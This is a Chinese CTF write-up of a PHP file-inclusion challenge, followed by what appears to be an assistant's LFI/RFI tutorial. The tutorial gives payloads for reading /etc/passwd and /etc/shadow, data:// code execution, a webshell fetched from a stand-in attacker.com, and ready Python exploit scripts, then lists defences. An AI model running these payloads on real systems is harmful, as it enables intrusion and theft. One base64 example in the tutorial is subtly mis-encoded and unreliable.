更简单的web题

```html

<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web3</title>
</head>
<body>
    <center>
    <h2>ctf.show_web3</h2>
    <hr>
    <h3>
    <code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php&nbsp;</span><span style="color: #007700">include(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'url'</span><span style="color: #007700">]);</span><span style="color: #0000BB">?&gt;</span>
</span>
</code>    </center>

</body>
</html>

```

反思：
由于网站没有提示回显，导致我构造的url不确定是否为正确，所以一直往错误方向思考，错失本题目
我构造的url `https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/url=baidu.com`
实际题目为：`https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/index.php?url=baidu.com`



根据题目提示，为php的include包含漏洞

`https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/index.php?url=php://filter/read=convert.base64-encode/resource=index.php` 构造查看文件内容的base64源代码，在解密查看网页源代码
因为直接访问 `https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/index.php?url=index.php` 会出现错误，页面不可见

所以根据php的伪协议`data://text/plain;base64,` 直接在 URL 中嵌入 Base64 编码的数据。实现执行任意 PHP 代码，但 URL 长度有限制。
`https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/index.php?url=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEnKTs/Pg==`
其中 `PD9waHAgc3lzdGVtKCdscyAtbGEnKTs/Pg==` == `<?php system('ls -la');?>`  
于是得知当前目录下  有敏感文件ctf_go_go_go
```html
total 20 drwxrwxrwx 1 www-data www-data 4096 Sep 20 09:49 . drwxr-xr-x 1 root root 4096 Oct 31 2019 .. -rw-r--r-- 1 www-data www-data 46 Sep 20 09:49 ctf_go_go_go -rw-r--r-- 1 www-data www-data 567 Feb 5 2020 index.php
ctf.show_web3
<?php include($_GET['url']);?>
```
开始构造查看`<?php system('cat ctf_go_go_go');?>` == `PD9waHAgc3lzdGVtKCdjYXQgY3RmX2dvX2dvX2dvJyk7Pz4=`
`https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/index.php?url=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgY3RmX2dvX2dvX2dvJyk7Pz4=`
得到flag `ctfshow{339d8c9f-7a92-43f5-8659-6de400e285e2}`


---

您好！您提供的 HTML 片段中包含的 PHP 代码 `include($_GET['url']);` 是一个非常典型的**文件包含漏洞 (File Inclusion Vulnerability)**。这种漏洞允许攻击者通过操纵 `url` 参数来包含服务器上的任意文件，甚至远程服务器上的文件，从而导致严重的安全问题。

### 漏洞分析

核心代码是：
```php
include($_GET['url']);
```
这行代码的含义是：PHP 脚本会获取 HTTP GET 请求中名为 `url` 的参数值，并将其作为文件路径包含进来。`include()` 函数会将指定文件的内容作为 PHP 代码执行。

由于没有对 `$_GET['url']` 的值进行任何过滤或验证，攻击者可以完全控制 `include()` 函数要包含的文件。

### 攻击思路和步骤

这种文件包含漏洞主要有两种攻击方式：**本地文件包含 (LFI)** 和 **远程文件包含 (RFI)**。

#### 1. 本地文件包含 (Local File Inclusion, LFI)

**思路**：攻击者尝试包含服务器本地的敏感文件，例如配置文件、日志文件、源代码等，以获取系统信息或凭据。

**步骤**：

1.  **探测敏感文件路径**：
    *   攻击者会尝试猜测或利用已知信息来包含服务器上常见的敏感文件路径。
    *   **Payload 示例**：
        *   读取 `/etc/passwd` (Linux 用户信息文件)：
            `http://example.com/vulnerable.php?url=/etc/passwd`
        *   读取 `/etc/shadow` (Linux 密码哈希文件，需要权限)：
            `http://example.com/vulnerable.php?url=/etc/shadow`
        *   读取 Apache/Nginx 配置文件：
            `http://example.com/vulnerable.php?url=/etc/apache2/apache2.conf` (Apache)
            `http://example.com/vulnerable.php?url=/etc/nginx/nginx.conf` (Nginx)
        *   读取 PHP 配置文件 `php.ini`：
            `http://example.com/vulnerable.php?url=/etc/php/7.4/apache2/php.ini` (路径可能因系统而异)
        *   读取应用程序自身的源代码：
            `http://example.com/vulnerable.php?url=index.php` (如果当前页面是 `index.php`)
            `http://example.com/vulnerable.php?url=../config.php` (尝试向上遍历目录)
        *   读取日志文件 (如 Apache/Nginx 访问日志 `access.log`)，结合日志注入：
            `http://example.com/vulnerable.php?url=/var/log/apache2/access.log`
            *   **日志注入原理**：攻击者向服务器发送一个包含恶意 PHP 代码的请求（例如，在 User-Agent 头中），这个请求会被记录到 `access.log` 中。然后，通过 LFI 包含 `access.log`，服务器就会执行日志文件中的恶意 PHP 代码。

2.  **利用 PHP 伪协议 (PHP Pseudo-Protocols)**：
    *   PHP 提供了一些特殊的伪协议，可以用于文件包含漏洞的利用，即使文件扩展名被限制。
    *   **`php://filter/read=convert.base64-encode/resource=`**：用于读取文件内容并进行 Base64 编码，绕过文件内容被直接执行的问题，方便查看源代码。
        *   **Payload 示例**：
            `http://example.com/vulnerable.php?url=php://filter/read=convert.base64-encode/resource=index.php`
            *   攻击者会得到 `index.php` 文件的 Base64 编码内容，解码后即可查看源代码。
    *   **`php://input`**：用于从 POST 请求体中读取数据作为文件内容。
        *   **Payload 示例**：
            `http://example.com/vulnerable.php?url=php://input`
            *   然后通过 POST 请求发送恶意 PHP 代码，例如 `<?php system('ls -la'); ?>`，服务器会执行这些代码。
    *   **`data://text/plain;base64,`**：直接在 URL 中嵌入 Base64 编码的数据。
        *   **Payload 示例**：
            `http://example.com/vulnerable.php?url=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEpOycpPz4=` (解码后是 `<?php system('ls -la');?>`)
            *   这种方式可以直接执行任意 PHP 代码，但 URL 长度有限制。

3.  **空字节截断 (Null Byte Truncation)**：
    *   在某些旧版本的 PHP 中，如果 `include()` 函数在处理文件路径时遇到空字节 (`%00`)，它会截断路径。这可以用来绕过文件扩展名限制。
    *   **Payload 示例**：
        `http://example.com/vulnerable.php?url=/etc/passwd%00.jpg`
        *   如果服务器期望包含一个 `.jpg` 文件，但攻击者想包含 `/etc/passwd`，就可以使用 `%00` 来截断 `.jpg` 部分。

**LFI 攻击代码示例 (Python)**：

```python
import requests
import base64

def exploit_lfi(target_url: str, file_path: str, method: str = "direct") -> str:
    """
    尝试利用本地文件包含 (LFI) 漏洞读取目标服务器上的文件。

    Args:
        target_url (str): 存在文件包含漏洞的URL，例如 "http://example.com/vulnerable.php".
        file_path (str): 目标服务器上要读取的文件路径，例如 "/etc/passwd" 或 "index.php".
        method (str): 攻击方法，可选值为 "direct" (直接包含) 或 "base64_filter" (使用php://filter进行base64编码读取)。

    Returns:
        str: 如果成功，返回读取到的文件内容；否则返回错误信息。

    Raises:
        ValueError: 如果target_url或file_path为空，或method无效。
        requests.exceptions.RequestException: 如果发生网络请求错误。

    常见应用场景:
        渗透测试中，用于验证LFI漏洞的存在性，并尝试读取服务器上的敏感文件。
    """
    if not target_url or not file_path:
        raise ValueError("目标URL和文件路径不能为空。")
    if method not in ["direct", "base64_filter"]:
        raise ValueError("无效的攻击方法。可选值为 'direct' 或 'base64_filter'。")

    try:
        if method == "direct":
            full_url = f"{target_url}?url={file_path}"
            print(f"尝试直接包含文件: {full_url}")
            response = requests.get(full_url, timeout=10)
            response.raise_for_status() # 检查HTTP错误
            return response.text

        elif method == "base64_filter":
            # 使用php://filter读取文件内容并进行base64编码
            filter_payload = f"php://filter/read=convert.base64-encode/resource={file_path}"
            full_url = f"{target_url}?url={filter_payload}"
            print(f"尝试使用base64过滤器读取文件: {full_url}")
            response = requests.get(full_url, timeout=10)
            response.raise_for_status() # 检查HTTP错误
            
            # 尝试解码响应内容
            try:
                # 响应中可能包含HTML标签或其他非base64内容，需要提取纯base64字符串
                # 简单的正则匹配来提取可能的base64字符串
                import re
                base64_match = re.search(r'[A-Za-z0-9+/=]{20,}', response.text) # 匹配至少20个base64字符
                if base64_match:
                    encoded_content = base64_match.group(0)
                    decoded_content = base64.b64decode(encoded_content).decode('utf-8', errors='ignore')
                    return f"Base64解码内容:\n{decoded_content}"
                else:
                    return f"未找到可解码的Base64内容。原始响应:\n{response.text}"
            except Exception as decode_err:
                return f"Base64解码失败: {decode_err}\n原始响应:\n{response.text}"

    except requests.exceptions.Timeout:
        return f"请求超时，无法连接到 {target_url}"
    except requests.exceptions.ConnectionError:
        return f"连接错误，无法连接到 {target_url}"
    except requests.exceptions.HTTPError as http_err:
        return f"HTTP 错误: {http_err} - 状态码: {response.status_code}\n响应内容:\n{response.text}"
    except Exception as e:
        return f"发生未知错误: {e}"

# --- 示例用法 ---
# 假设目标URL是 http://localhost/vulnerable.php
# 请将 'http://localhost/vulnerable.php' 替换为实际的目标URL
target = "http://localhost/vulnerable.php"

print("--- 尝试直接读取 /etc/passwd ---")
result_passwd = exploit_lfi(target, "/etc/passwd", "direct")
print(result_passwd)

print("\n--- 尝试使用 Base64 过滤器读取 index.php ---")
result_index_php = exploit_lfi(target, "index.php", "base64_filter")
print(result_index_php)

# 尝试读取一个不存在的文件，观察错误
print("\n--- 尝试读取一个不存在的文件 ---")
result_non_existent = exploit_lfi(target, "/non_existent_file.txt", "direct")
print(result_non_existent)
```

#### 2. 远程文件包含 (Remote File Inclusion, RFI)

**思路**：如果 `allow_url_include` 在 `php.ini` 中被设置为 `On` (默认是 `Off`，但旧版本或配置不当的服务器可能开启)，攻击者可以包含一个位于自己控制的远程服务器上的文件。这通常用于执行任意代码。

**步骤**：

1.  **搭建恶意服务器**：
    *   攻击者在自己控制的服务器上创建一个包含恶意 PHP 代码的文件，例如 `evil.txt`：
        ```php
        <?php system($_GET['cmd']); ?>
        ```
        或者更复杂的 WebShell。
2.  **构造 RFI Payload**：
    *   攻击者通过 `url` 参数指向恶意服务器上的文件。
    *   **Payload 示例**：
        `http://example.com/vulnerable.php?url=http://attacker.com/evil.txt`
3.  **执行远程代码**：
    *   一旦 `evil.txt` 被包含并执行，攻击者就可以通过 `cmd` 参数在目标服务器上执行任意命令。
    *   **Payload 示例**：
        `http://example.com/vulnerable.php?url=http://attacker.com/evil.txt&cmd=ls%20-la`
        *   这将执行 `ls -la` 命令并显示结果。

**RFI 攻击代码示例 (Python)**：

```python
import requests

def exploit_rfi(target_url: str, remote_evil_file_url: str, command: str = None) -> str:
    """
    尝试利用远程文件包含 (RFI) 漏洞执行远程代码。
    此方法假设远程文件包含已启用，并且远程文件包含一个简单的WebShell，
    例如 `<?php system($_GET['cmd']); ?>`。

    Args:
        target_url (str): 存在文件包含漏洞的URL，例如 "http://example.com/vulnerable.php".
        remote_evil_file_url (str): 攻击者控制的远程服务器上恶意文件的URL，
                                     例如 "http://attacker.com/evil.txt".
        command (str, optional): 要在目标服务器上执行的操作系统命令。如果为None，则只包含文件。

    Returns:
        str: 如果成功，返回命令执行结果或文件包含的响应；否则返回错误信息。

    Raises:
        ValueError: 如果target_url或remote_evil_file_url为空。
        requests.exceptions.RequestException: 如果发生网络请求错误。

    常见应用场景:
        渗透测试中，用于验证RFI漏洞的存在性，并在目标服务器上执行任意操作系统命令。
    """
    if not target_url or not remote_evil_file_url:
        raise ValueError("目标URL和远程恶意文件URL不能为空。")

    try:
        if command:
            # 假设远程文件包含一个简单的WebShell，如 <?php system($_GET['cmd']); ?>
            full_url = f"{target_url}?url={remote_evil_file_url}&cmd={command}"
            print(f"尝试通过RFI执行命令: {full_url}")
        else:
            full_url = f"{target_url}?url={remote_evil_file_url}"
            print(f"尝试远程包含文件: {full_url}")

        response = requests.get(full_url, timeout=10)
        response.raise_for_status() # 检查HTTP错误
        return response.text

    except requests.exceptions.Timeout:
        return f"请求超时，无法连接到 {target_url}"
    except requests.exceptions.ConnectionError:
        return f"连接错误，无法连接到 {target_url}"
    except requests.exceptions.HTTPError as http_err:
        return f"HTTP 错误: {http_err} - 状态码: {response.status_code}\n响应内容:\n{response.text}"
    except Exception as e:
        return f"发生未知错误: {e}"

# --- 示例用法 ---
# 假设目标URL是 http://localhost/vulnerable.php
# 假设攻击者控制的恶意文件URL是 http://attacker.com/evil.txt
# 请将 'http://localhost/vulnerable.php' 和 'http://attacker.com/evil.txt' 替换为实际的URL
target = "http://localhost/vulnerable.php"
evil_file = "http://attacker.com/evil.txt" # 这是一个假设的URL，您需要自己搭建一个包含恶意PHP代码的服务器

print("--- 尝试远程包含恶意文件 (不执行命令) ---")
result_rfi_include = exploit_rfi(target, evil_file)
print(result_rfi_include)

print("\n--- 尝试通过RFI执行 'id' 命令 ---")
result_rfi_cmd = exploit_rfi(target, evil_file, "id")
print(result_rfi_cmd)
```

### 漏洞危害

文件包含漏洞的危害非常大，可能导致：

*   **敏感信息泄露**：读取数据库凭据、API 密钥、用户密码哈希等。
*   **任意代码执行 (RCE)**：通过包含恶意文件（无论是本地日志文件注入还是远程 WebShell），攻击者可以在服务器上执行任意操作系统命令，完全控制服务器。
*   **WebShell 上传**：通过 RFI 或 LFI 结合日志注入等方式，攻击者可以上传并执行 WebShell，从而获得持久化的服务器访问权限。
*   **进一步渗透**：作为跳板，攻击者可以利用受感染的服务器攻击内网的其他系统。

### 防御措施

为了防止此类文件包含漏洞，开发者应该：

1.  **严格验证用户输入**：对所有用户提供的文件路径进行严格的白名单验证，只允许包含预定义、安全的文件。
2.  **禁用远程文件包含**：在 `php.ini` 中将 `allow_url_include` 设置为 `Off` (这是默认值，但需要确保没有被修改)。
3.  **限制文件包含目录**：使用 `open_basedir` 限制 PHP 脚本可以访问的文件系统路径。
4.  **最小权限原则**：Web 服务器运行的用户应具有最小的权限，以限制攻击者即使成功包含文件也无法造成太大损害。
5.  **不要在错误信息中泄露敏感路径**：关闭生产环境的错误报告，避免攻击者通过错误信息获取文件路径。
6.  **代码审计和安全测试**：定期对代码进行安全审计，并使用工具进行漏洞扫描。

**重要提示**：上述攻击思路和代码仅用于**学习和安全研究目的**。**在未经授权的情况下，对任何系统进行渗透测试都是非法行为，可能导致严重的法律后果。请务必遵守法律法规和道德规范。**
       